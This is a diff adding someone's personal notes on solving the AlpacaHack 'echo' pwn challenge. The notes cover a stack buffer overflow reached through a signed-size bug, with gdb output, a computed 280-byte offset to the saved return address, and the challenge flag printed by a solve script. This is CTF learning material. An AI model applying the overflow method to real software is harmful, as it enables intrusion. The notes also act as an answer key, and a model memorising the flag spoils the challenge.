@@ -1,0 +1,118 @@
+- Link
+https://alpacahack.com/challenges/echo
+
+- pwn 
+https://qiita.com/trimscash/items/71f417f99508f8ca78f8
+
+
+- To disable `stack smashing detected`
+```
+g++ -fno-stack-protector test_stack_overflow.cpp
+```
+
+# checksec
+```
+checksec --file=echo
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   46 Symbols        No    0               2               echo
+```
+
+>>> 1<<31
+2147483648
+-2147483648
+
+# buf address
+Breakpoint 1, get_data (buf=0x7ffc44097660 "\177\003", size=2147483648) at main.c:33
+
+# rsp
+(gdb) info registers rsp
+rsp            0x7ffc44097630      0x7ffc44097630
+
+# solution
+
+## add breakpoint 
+```
+b get_data
+b main.c:38
+```
+
+## run
+```
+r 
+-2147483648 (size to hack abs)
+abcdefghijklmnopqrstuvwxyz (any string)
+```
+
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+
+## check address(distance between buf[0] and rip)
+```
+(gdb) bt
+#0  get_data (buf=0x7ffc14753480 "\177\003", size=2147483648) at main.c:33
+#1  0x00005613310af391 in echo () at main.c:51
+#2  0x00005613310af3e7 in main () at main.c:60
+```
+### addrewss of buf[0]
+```
+(gdb) p &(buf[0])
+$1 = 0x7ffc14753480 "\177\003"
+```
+### rip of echo()
+```
+(gdb) f 1
+#1  0x00005613310af391 in echo () at main.c:51
+51        get_data(buf, size);
+(gdb) info frame
+Stack level 1, frame at 0x7ffc147535a0:
+ rip = 0x5613310af391 in echo (main.c:51); saved rip = 0x5613310af3e7
+ called by frame at 0x7ffc147535b0, caller of frame at 0x7ffc14753480
+ source language c++.
+ Arglist at 0x7ffc14753590, args: 
+ Locals at 0x7ffc14753590, Previous frame's sp is 0x7ffc147535a0
+ Saved registers:
+  rbp at 0x7ffc14753590, rip at 0x7ffc14753598
+```
+
+### print rsp and find rip(0x5613310af3e7), Found at 0x7ffc14753590+8
+```
+x/100x $rsp
+0x7ffc14753480: 0x0000037f      0x00000000      0x3112d005      0x00000000
+0x7ffc14753490: 0x14753680      0x00007ffc      0x00000000      0x00000000
+0x7ffc147534a0: 0x7e782000      0x00007f28      0x14753568      0x00007ffc
+0x7ffc147534b0: 0x147535b0      0x00007ffc      0x7e79bddb      0x00007f28
+0x7ffc147534c0: 0x00000002      0x00000000      0x00000000      0x00000000
+0x7ffc147534d0: 0x00000000      0x00000000      0x00000019      0x00000000
+0x7ffc147534e0: 0x00000010      0x00000000      0x00000040      0x00000000
+0x7ffc147534f0: 0x00000008      0x00000000      0x00c00000      0x00000000
+0x7ffc14753500: 0x7e76e5c0      0x00007f28      0x00000000      0x00000000
+0x7ffc14753510: 0x14753540      0x00007ffc      0x7e5ffc0f      0x00007f28
+0x7ffc14753520: 0x7e76e5c0      0x00007f28      0x00000000      0x00000000
+0x7ffc14753530: 0x00000000      0x00000000      0x7e76c030      0x00007f28
+0x7ffc14753540: 0x14753560      0x00007ffc      0x7e5fc405      0x00007f28
+0x7ffc14753550: 0x00000000      0x00000000      0x7e76e5c0      0x00007f28
+0x7ffc14753560: 0x14753590      0x00007ffc      0x7e5f247b      0x00007f28
+0x7ffc14753570: 0x147536c8      0x00007ffc      0x00000001      0x00000000
+0x7ffc14753580: 0x00000000      0x00000000      0x310b1d90      0x80000000
+0x7ffc14753590: 0x147535a0      0x00007ffc      0x310af3e7      0x00005613 <----- 
+0x7ffc147535a0: 0x14753640      0x00007ffc      0x7e5941ca      0x00007f28
+0x7ffc147535b0: 0x147535f0      0x00007ffc      0x147536c8      0x00007ffc
+0x7ffc147535c0: 0x310ae040      0x00000001      0x310af3b2      0x00005613
+0x7ffc147535d0: 0x147536c8      0x00007ffc      0x7bc22d64      0xc5b40f0f
+0x7ffc147535e0: 0x00000001      0x00000000      0x00000000      0x00000000
+0x7ffc147535f0: 0x310b1d90      0x00005613      0x7e7ba000      0x00007f28
+0x7ffc14753600: 0x7c222d64      0xc5b40f0f      0x94402d64      0xc41cdb57
+```
+
+### difference
+```
+python3
+In [9]: 0x7ffc14753590 + 8 - 0x7ffc14753480
+Out[9]: 280
+```
+
+buf(256) + size(4) + (20)??
+
+## run solve.py
+b'Received: 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+\xf6\x11@\nAlpaca{s1Gn3d_4Nd_uNs1gn3d_s1zEs_c4n_cAu5e_s3ri0us_buGz}\n'
